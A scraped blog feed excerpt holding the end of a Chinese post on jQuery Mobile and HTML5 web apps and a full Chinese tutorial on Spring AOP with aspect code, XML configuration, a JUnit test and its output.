<p>接下来，Kayo 介绍一下使用 jQuery Mobile 与 HTML5 快速开发 Web Apps 的一个解决方案：设备检测方案、响应式设计、UI、模拟原生 Apps 的各种效果和操作主要交给 jQuery Mobile 框架，选项存储使用 Web Storage ，并使用 manifest 存储静态的文件（CSS、JavaScript、图片），由于内容是动态生成的，因此页面文档没有使用 manifest 缓存，实际上，若开发者使用主流的移动开发框架进行 Web Apps 快速开发，都可以尝试使用这个方案，基本上这个方案已经可以调节好开发的需要与效率的问题。</p>


<p>现在，可以打开下面的例子，感受 HTML5 开发 Web Apps 的魅力了！</p>


<p>完整 <a href="http://jqmhtml5.sinaapp.com/" title="jQuery Mobile 与 HTML5 记事本" target="_blank">Demo</a>（在触摸环境中请使用 iphone/ipad ，Android 的系统默认浏览器浏览，桌面环境中请使用 Chrome 、Firefox 等现代浏览器浏览）。</p>


<p><strong>小提示：1.触摸环境中在相应的事项上向右划动可以删除该事项，桌面环境中可以按住鼠标左键向右划动达到相同效果；2.为了方便用户测试，本记事本无须注册，直接打开即可使用，因此测试时请勿以个人重要信息进行测试，以免泄漏信息。</strong></p>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Spring AOP详解]]></title>
    <link href="http://archulate.github.io/blog/2012/05/13/spring/"/>
    <updated>2012-05-13T18:07:41+08:00</updated>
    <id>http://archulate.github.io/blog/2012/05/13/spring</id>
    <content type="html"><![CDATA[<!--more-->


<p> <meta name="description" content="      此前对于AOP的使用仅限于声明式事务，除此之外在实际开发中也没有遇到过与之相关的问题。最近项目中遇到了以下几点需求，仔细思考之后，觉得采用AOP 来解决。一方面是为了以更加灵活的方式来解决问题，另一方面是借此机会深入学习Spring AOP相关的内容。本文是权当本人的自己AOP学习笔记，以下需求不用AOP肯定也能解决，至于是否牵强附会，仁者见仁智者见智。      对部分函数的调用进行日 ..." /></p>

<pre><code>&lt;meta name="keywords" content="AOP, Spring, junit, Bean, JDK Spring AOP 详解" /&gt;
&lt;link rel="shortcut icon" href="http://archulate.github.io/images/favicon.ico" type="image/x-icon" /&gt;
&lt;link rel="search" type="application/opensearchdescription+xml" href="http://archulate.github.io/open_search.xml" title="ITeye" /&gt;
&lt;link href="http://archulate.github.io/rss" rel="alternate" title="pandonix" type="application/rss+xml" /&gt;
&lt;link href="http://www.iteye.com/stylesheets/blog.css?1393218040" media="screen" rel="stylesheet" type="text/css" /&gt;
</code></pre>

<p><link href="http://www.iteye.com/stylesheets/themes/blog/blue.css?1326191326" media="screen" rel="stylesheet" type="text/css" /></p>

<pre><code>&lt;script src="http://www.iteye.com/javascripts/application.js?1358214518" type="text/javascript"&gt;&lt;/script&gt;
&lt;script type="text/javascript"&gt;
</code></pre>

<p>  var <em>gaq = </em>gaq || [];
  <em>gaq.push([&lsquo;</em>setAccount&rsquo;, &lsquo;UA-535605-1&rsquo;]);
  <em>gaq.push([&lsquo;</em>setDomainName&rsquo;, &lsquo;iteye.com&rsquo;]);
  <em>gaq.push([&lsquo;</em>trackPageview&rsquo;]);</p>

<p>  (function() {</p>

<pre><code>var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
</code></pre>

<p>  })();</p>

<p></script></p>

<pre><code>  &lt;link href="http://www.iteye.com/javascripts/syntaxhighlighter/SyntaxHighlighter.css?1348819953" media="screen" rel="stylesheet" type="text/css" /&gt;
</code></pre>

<p>  <script src="http://www.iteye.com/javascripts/syntaxhighlighter/shCoreCommon.js?1325907333" type="text/javascript"></script></p>

<script src="http://www.iteye.com/javascripts/hotkey.js?1324994303" type="text/javascript"></script>


<p>  <script src="http://www.iteye.com/javascripts/code_favorites.js?1358214518" type="text/javascript"></script></p>

<script src="http://www.iteye.com/javascripts/weiboshare.js?1324994303" type="text/javascript"></script>


<p>  </head>
  <body></p>

<pre><code>&lt;div id="header"&gt;
  &lt;div id="blog_site_nav"&gt;
</code></pre>

<p>  <a href="http://www.iteye.com/" class="homepage">首页</a>
  <a href="http://www.iteye.com/news">资讯</a>
  <a href="http://www.iteye.com/magazines">精华</a>
  <a href="http://www.iteye.com/forums">论坛</a>
  <a href="http://www.iteye.com/ask">问答</a>
  <a href="http://www.iteye.com/blogs">博客</a>
  <a href="http://www.iteye.com/blogs/subjects">专栏</a>
  <a href="http://www.iteye.com/groups">群组</a>
  <a href="#" onclick="return false;" id="msna"><u>更多</u> <small>▼</small></a>
  <div class="quick_menu" style="display:none;"></p>

<pre><code>&lt;a target="_blank" href="http://job.iteye.com/iteye"&gt;招聘&lt;/a&gt;
&lt;a href="http://www.iteye.com/search"&gt;搜索&lt;/a&gt;
</code></pre>

<p>  </div>
</div></p>

<pre><code>  &lt;div id="user_nav"&gt;
  &lt;a href="http://archulate.github.io/login" class="welcome" title="登录"&gt;您还未登录 !&lt;/a&gt;
&lt;a href="http://archulate.github.io/login"&gt;登录&lt;/a&gt;
&lt;a href="http://archulate.github.io/signup" class="nobg"&gt;注册&lt;/a&gt;
</code></pre>

<p>  </div></p>

<pre><code>&lt;/div&gt;

&lt;div id="page"&gt;
  &lt;div id="branding" class="clearfix"&gt;
    &lt;div id="blog_name"&gt;
      &lt;h1&gt;&lt;a href="http://archulate.github.io/"&gt;pandonix&lt;/a&gt;&lt;/h1&gt;
    &lt;/div&gt;
    &lt;div id='fd'&gt;&lt;/div&gt;
    &lt;div id="blog_navbar"&gt;
      &lt;ul&gt;
        &lt;li class='blog_navbar_for'&gt;&lt;a href="http://pandonix.iteye.com"&gt;&lt;strong&gt;博客&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
        &lt;li &gt;&lt;a href="http://archulate.github.io/weibo"&gt;微博&lt;/a&gt;&lt;/li&gt;
        &lt;li &gt;&lt;a href="http://archulate.github.io/album"&gt;相册&lt;/a&gt;&lt;/li&gt;
        &lt;li &gt;&lt;a href="http://archulate.github.io/link"&gt;收藏&lt;/a&gt;&lt;/li&gt;
        &lt;li &gt;&lt;a href="http://archulate.github.io/blog/guest_book"&gt;留言&lt;/a&gt;&lt;/li&gt;
        &lt;li &gt;&lt;a href="http://archulate.github.io/blog/profile"&gt;关于我&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;

      &lt;div class="search"&gt;
        &lt;form action="/blog/search" method="get"&gt;
          &lt;input class="search_text" id="query" name="query" style="margin-left: 10px;width: 110px;" type="text" value="" /&gt;
          &lt;input class="submit_search" type="submit" value="" /&gt;
        &lt;/form&gt;
      &lt;/div&gt; 
      &lt;div id="fd"&gt;&lt;/div&gt;         
    &lt;/div&gt;
  &lt;/div&gt;

  &lt;div id="content" class="clearfix"&gt;
    &lt;div id="main"&gt;
</code></pre>

<div class="h-entry" style='display:none'>
  <a href="http://pandonix.iteye.com" class="p-author" target="_blank">pandonix</a>
</div>




<p><div class="blog_main">
  <div class="blog_title"></p>

<pre><code>&lt;h3&gt;
  &lt;a href="http://archulate.github.io/blog/336873"&gt;Spring AOP 详解&lt;/a&gt;
  &lt;em class="actions"&gt;      &lt;/em&gt;
&lt;/h3&gt;
&lt;ul class='blog_categories'&gt;&lt;strong&gt;博客分类：&lt;/strong&gt; &lt;li&gt;&lt;a href="http://archulate.github.io/category/20309"&gt;J2EE&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;
    &lt;div class='news_tag'&gt;&lt;a href="http://www.iteye.com/blogs/tag/AOP"&gt;AOP&lt;/a&gt;&lt;a href="http://www.iteye.com/blogs/tag/Spring"&gt;Spring&lt;/a&gt;&lt;a href="http://www.iteye.com/blogs/tag/junit"&gt;junit&lt;/a&gt;&lt;a href="http://www.iteye.com/blogs/tag/Bean"&gt;Bean&lt;/a&gt;&lt;a href="http://www.iteye.com/blogs/tag/JDK"&gt;JDK&lt;/a&gt;&amp;nbsp;&lt;/div&gt;
</code></pre>

<p>  </div></p>

<p>  <div id="blog_content" class="blog_content"></p>

<pre><code>&lt;p&gt;      此前对于AOP的使用仅限于声明式事务，除此之外在实际开发中也没有遇到过与之相关的问题。最近项目中遇到了以下几点需求，仔细思考之后，觉得采用AOP
</code></pre>

<p>来解决。一方面是为了以更加灵活的方式来解决问题，另一方面是借此机会深入学习Spring
AOP相关的内容。本文是权当本人的自己AOP学习笔记，以下需求不用AOP肯定也能解决，至于是否牵强附会，仁者见仁智者见智。</p>
<ol>
<li></p>

<pre><code>对部分函数的调用进行日志记录，用于观察特定问题在运行过程中的函数调用情况&lt;/li&gt;
</code></pre>

<p><li>监控部分重要函数，若抛出指定的异常，需要以短信或邮件方式通知相关人员</li>
<li>金控部分重要函数的执行时间</li>
</ol>
<p>    事实上，以上需求没有AOP也能搞定，只是在实现过程中比较郁闷摆了。</p>
<ol>
<li>需要打印日志的函数分散在各个包中，只能找到所有的函数体，手动添加日志。然而这些日志都是临时的，待问题解决之后应该需要清除打印日志的代码，只能再次手动清除^_^!</li>
<li>类
似1的情况，需要捕获异常的地方太多，如果手动添加时想到很可能明天又要手动清除，只能再汗。OK，该需求相对比较固定，属于长期监控的范畴，并不需求临
时添加后再清除。然而，客户某天要求，把其中20%的异常改为短信提醒，剩下的80%改用邮件提醒。改之，两天后，客户抱怨短信太多，全部改成邮件提
醒&hellip;</li>
<li>该需求通常用于监控某些函数的执行时间，用以判断系统执行慢的瓶颈所在。瓶颈被解决之后，烦恼同情况1</li>
</ol>
<p><br />
<span>    </span>
终于下定决心，采用AOP来解决！代码如下：</p>
<p> </p>
<p>    切面类TestAspect</p>
<pre name="code" class="java">package com.spring.aop;
/<em>*
 * 切面
 *
 </em>/
public class TestAspect {</p>

<pre><code>public void doAfter(JoinPoint jp) {
    System.out.println("log Ending method: "
            + jp.getTarget().getClass().getName() + "."
            + jp.getSignature().getName());
}

public Object doAround(ProceedingJoinPoint pjp) throws Throwable {
    long time = System.currentTimeMillis();
    Object retVal = pjp.proceed();
    time = System.currentTimeMillis() - time;
    System.out.println("process time: " + time + " ms");
    return retVal;
}

public void doBefore(JoinPoint jp) {
    System.out.println("log Begining method: "
            + jp.getTarget().getClass().getName() + "."
            + jp.getSignature().getName());
}

public void doThrowing(JoinPoint jp, Throwable ex) {
    System.out.println("method " + jp.getTarget().getClass().getName()
            + "." + jp.getSignature().getName() + " throw exception");
    System.out.println(ex.getMessage());
}

private void sendEx(String ex) {
    //TODO 发送短信或邮件提醒
}
</code></pre>

<p>} </pre>
<p> </p>
<p> </p>
<pre name="code" class="java">package com.spring.service;
/<em>*
 * 接口A
 </em>/
public interface AService {</p>

<pre><code>public void fooA(String _msg);

public void barA();
</code></pre>

<p>}</pre></p>

<p><pre name="code" class="java">package com.spring.service;
/<em><em>
 </em>接口A的实现类
 </em>/
public class AServiceImpl implements AService {</p>

<pre><code>public void barA() {
    System.out.println("AServiceImpl.barA()");
}

public void fooA(String _msg) {
    System.out.println("AServiceImpl.fooA(msg:"+_msg+")");
}
</code></pre>

<p>}</pre>
<p> </p>
<p> </p>
<pre name="code" class="java">package com.spring.service;</p>

<p>/<em>*
 *   Service类B
 </em>/
public class BServiceImpl {</p>

<pre><code>public void barB(String _msg, int _type) {
    System.out.println("BServiceImpl.barB(msg:"+_msg+" type:"+_type+")");
    if(_type == 1)
        throw new IllegalArgumentException("测试异常");
}

public void fooB() {
    System.out.println("BServiceImpl.fooB()");
}
</code></pre>

<p>}</pre></p>

<p><p>    ApplicationContext</p>
<pre name="code" class="java">&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo;?&gt;
&lt;beans xmlns=&ldquo;<a href="http://www.springframework.org/schema/beans">http://www.springframework.org/schema/beans</a>&rdquo;</p>

<pre><code>xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:aop="http://www.springframework.org/schema/aop"
xsi:schemaLocation="
        http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
        http://www.springframework.org/schema/aop
        http://www.springframework.org/schema/aop/spring-aop-2.5.xsd"
default-autowire="autodetect"&amp;gt;
&amp;lt;aop:config&amp;gt;
    &amp;lt;aop:aspect id="TestAspect" ref="aspectBean"&amp;gt;
        &amp;lt;!--配置com.spring.service包下所有类或接口的所有方法--&amp;gt;
        &amp;lt;aop:pointcut id="businessService"
            expression="execution(* com.spring.service.*.*(..))" /&amp;gt;
        &amp;lt;aop:before pointcut-ref="businessService" method="doBefore"/&amp;gt;
        &amp;lt;aop:after pointcut-ref="businessService" method="doAfter"/&amp;gt;
        &amp;lt;aop:around pointcut-ref="businessService" method="doAround"/&amp;gt;
        &amp;lt;aop:after-throwing pointcut-ref="businessService" method="doThrowing" throwing="ex"/&amp;gt;
    &amp;lt;/aop:aspect&amp;gt;
&amp;lt;/aop:config&amp;gt;

&amp;lt;bean id="aspectBean" class="com.spring.aop.TestAspect" /&amp;gt;
&amp;lt;bean id="aService" class="com.spring.service.AServiceImpl"&amp;gt;&amp;lt;/bean&amp;gt;
&amp;lt;bean id="bService" class="com.spring.service.BServiceImpl"&amp;gt;&amp;lt;/bean&amp;gt;
</code></pre>

<p>&lt;/beans&gt;</pre>
<p> </p>
<p>    测试类AOPTest</p>
<pre name="code" class="java">public class AOPTest extends AbstractDependencyInjectionSpringContextTests {</p>

<pre><code>private AService aService;

private BServiceImpl bService;

protected String[] getConfigLocations() {
    String[] configs = new String[] { "/applicationContext.xml"};
    return configs;
}


/**
 * 测试正常调用
 */
public void testCall()
{
    System.out.println("SpringTest JUnit test");
    aService.fooA("JUnit test fooA");
    aService.barA();
    bService.fooB();
    bService.barB("JUnit test barB",0);
}

/**
 * 测试After-Throwing
 */
public void testThrow()
{
    try {
        bService.barB("JUnit call barB",1);
    } catch (IllegalArgumentException e) {

    }
}

public void setAService(AService service) {
    aService = service;
}

public void setBService(BServiceImpl service) {
    bService = service;
}
</code></pre>

<p>}</pre>
<p> </p>
<p>    运行结果如下：</p>
<pre name="code" class="java">log Begining method: com.spring.service.AServiceImpl.fooA
AServiceImpl.fooA(msg:JUnit test fooA)
log Ending method: com.spring.service.AServiceImpl.fooA
process time: 0 ms
log Begining method: com.spring.service.AServiceImpl.barA
AServiceImpl.barA()
log Ending method: com.spring.service.AServiceImpl.barA
process time: 0 ms
log Begining method: com.spring.service.BServiceImpl.fooB
BServiceImpl.fooB()
log Ending method: com.spring.service.BServiceImpl.fooB
process time: 0 ms
log Begining method: com.spring.service.BServiceImpl.barB
BServiceImpl.barB(msg:JUnit test barB type:0)
log Ending method: com.spring.service.BServiceImpl.barB
process time: 0 ms</p>

<p>log Begining method: com.spring.service.BServiceImpl.barB
BServiceImpl.barB(msg:JUnit call barB type:1)
log Ending method: com.spring.service.BServiceImpl.barB
method com.spring.service.BServiceImpl.barB throw exception
测试异常</pre></p>

<p><p>    《Spring参考手册》中定义了以下几个AOP的重要概念，结合以上代码分析如下：</p>
<ul>
<li><span style="color: #0000ff;">切面（Aspect）</span>
：官方的抽象定义为“一个关注点的模块化，这个关注点可能会横切多个对象”，在本例中，“切面”就是类TestAspect所关注的具体行为，例如，AServiceImpl.barA()的调用就是切面TestAspect所关注的行为之一。“切面”在ApplicationContext中&lt;aop:aspect&gt;来配置。</li>
<li><span style="color: #0000ff;">连接点（Joinpoint）</span>
：程序执行过程中的某一行为，例如，AServiceImpl.barA()的调用或者BServiceImpl.barB(String <em>msg, int </em>type)抛出异常等行为。</li>
<li><span style="color: #0000ff;">通知（Advice）</span>
：“切面”对于某个“连接点”所产生的动作，例如，TestAspect中对com.spring.service包下所有类的方法进行日志记录的动作就是一个Advice。其中，一个“切面”可以包含多个“Advice”，例如TestAspect</li>
<li><span style="color: #0000ff;">切入点（Pointcut）</span>
：匹配连接点的断言，在AOP中通知和一个切入点表达式关联。例如，TestAspect中的所有通知所关注的连接点，都由切入点表达式execution(<em> com.spring.service.</em>.<em>(..))来决定</li>
<li><span style="color: #0000ff;">目标对象（Target Object）</span>
：被一个或者多个切面所通知的对象。例如，AServcieImpl和BServiceImpl，当然在实际运行时，Spring AOP采用代理实现，实际AOP操作的是TargetObject的代理对象。</li>
<li><span style="color: #0000ff;">AOP代理（AOP Proxy）</span>
在Spring AOP中有两种代理方式，JDK动态代理和CGLIB代理。默认情况下，TargetObject实现了接口时，则采用JDK动态代理，例如，AServiceImpl；反之，采用CGLIB代理，例如，BServiceImpl。强制使用CGLIB代理需要将 <code class="literal">&lt;aop:config&gt;</code>
 的 <code class="literal">proxy-target-class</code>
 属性设为true</li>
</ul>
<p>       <span style="color: #0000ff;">通知（Advice）类型</span>
</p>
<ul>
<li><span style="color: #0000ff;">前置通知（Before advice）</span>
：在某连接点（JoinPoint）之前执行的通知，但这个通知不能阻止连接点前的执行。ApplicationContext中在&lt;aop:aspect&gt;里面使用&lt;aop:before&gt;元素进行声明。例如，TestAspect中的doBefore方法</li>
<li><span style="color: #0000ff;">后通知（After advice）</span>
：当某连接点退出的时候执行的通知（不论是正常返回还是异常退出）。ApplicationContext中在&lt;aop:aspect&gt;里面使用&lt;aop:after&gt;元素进行声明。例如，TestAspect中的doAfter方法，所以AOPTest中调用BServiceImpl.barB抛出异常时，doAfter方法仍然执行</li>
<li><span style="color: #0000ff;">返回后通知（After return advice）</span>
：在某连接点正常完成后执行的通知，不包括抛出异常的情况。ApplicationContext中在&lt;aop:aspect&gt;里面使用&lt;after-returning&gt;元素进行声明。</li>
<li><span style="color: #0000ff;">环绕通知（Around advice）</span>
：包围一个连接点的通知，类似Web中Servlet规范中的Filter的doFilter方法。可以在方法的调用前后完成自定义的行为，也可以选择不执行。ApplicationContext中在&lt;aop:aspect&gt;里面使用&lt;aop:around&gt;元素进行声明。例如，TestAspect中的doAround方法。</li>
<li><span style="color: #0000ff;">抛出异常后通知（After throwing advice）</span>
：
在方法抛出异常退出时执行的通知。 ApplicationContext中在&lt;aop:aspect&gt;里面使用&lt;aop:after-throwing&gt;元素进行声明。例如，TestAspect中的doThrowing方法。</li>
</ul>
<p>       <span style="color: #0000ff;">切入点表达式</span>
</p>
<ul>
<li>通常情况下，表达式中使用”execution“就可以满足大部分的要求。表达式格式如下：</li>
</ul>
<pre name="code" class="java">execution(modifiers-pattern? ret-type-pattern declaring-type-pattern? name-pattern(param-pattern) throws-pattern?)</pre>
<p style="padding-left: 30px;">modifiers-pattern：方法的操作权限</p>
<p style="padding-left: 30px;">ret-type-pattern：返回值</p>
<p style="padding-left: 30px;">declaring-type-pattern：方法所在的包</p>
<p style="padding-left: 30px;">name-pattern：方法名</p>
<p style="padding-left: 30px;">parm-pattern：参数名</p>
<p style="padding-left: 30px;">throws-pattern：异常</p>
<p style="padding-left: 30px;">其中，除ret-type-pattern和name-pattern之外，其他都是可选的。上例中，execution(</em> com.spring.service.<em>.</em>(..))表示com.spring.service包下，返回值为任意类型；方法名任意；参数不作限制的所有方法。</p>
<ul>
<li>通知参数</li>
</ul>
<p style="padding-left: 30px;">可以通过args来绑定参数，这样就可以在通知（Advice）中访问具体参数了。例如，&lt;aop:aspect&gt;配置如下</p>
<pre name="code" class="java">  &lt;aop:config&gt;</p>

<pre><code>    &amp;lt;aop:aspect id="TestAspect" ref="aspectBean"&amp;gt;
        &amp;lt;aop:pointcut id="businessService"
            expression="execution(* com.spring.service.*.*(String,..)) and args(msg,..)" /&amp;gt;
            &amp;lt;aop:after pointcut-ref="businessService" method="doAfter"/&amp;gt;
    &amp;lt;/aop:aspect&amp;gt;
&amp;lt;/aop:config&amp;gt;&lt;/pre&gt;
</code></pre>

<p><p style="padding-left: 30px;">TestAspect的doAfter方法中就可以访问msg参数，但这样以来AService中的barA()和BServiceImpl中的barB()就不再是连接点，因为execution(<em> com.spring.service.</em>.*(String,..))只配置第一个参数为String类型的方法。其中，doAfter方法定义如下：</p>
<pre name="code" class="java">public void doAfter(JoinPoint jp,String msg)</pre>
<ul>
<li>  访问当前的连接点</li>
</ul>
<p style="padding-left: 30px;">任何通知（Advice）方法可以将第一个参数定义为 <code class="interfacename">org.aspectj.lang.JoinPoint</code>
 类型。<code class="interfacename">JoinPoint</code>
 接口提供了一系列有用的方法， 比如 <code class="literal">getArgs()</code>
（返回方法参数）、<code class="literal">getThis()</code>
（返回代理对象）、<code class="literal">getTarget()</code>
（返回目标）、<code class="literal">getSignature()</code>
（返回正在被通知的方法相关信息）和 <code class="literal">toString()</code>
（打印出正在被通知的方法的有用信息。</p>
<p> </p>
<p> </p>
<p> </p>
  </div></p>
]]></content>
  </entry>
  
</feed>
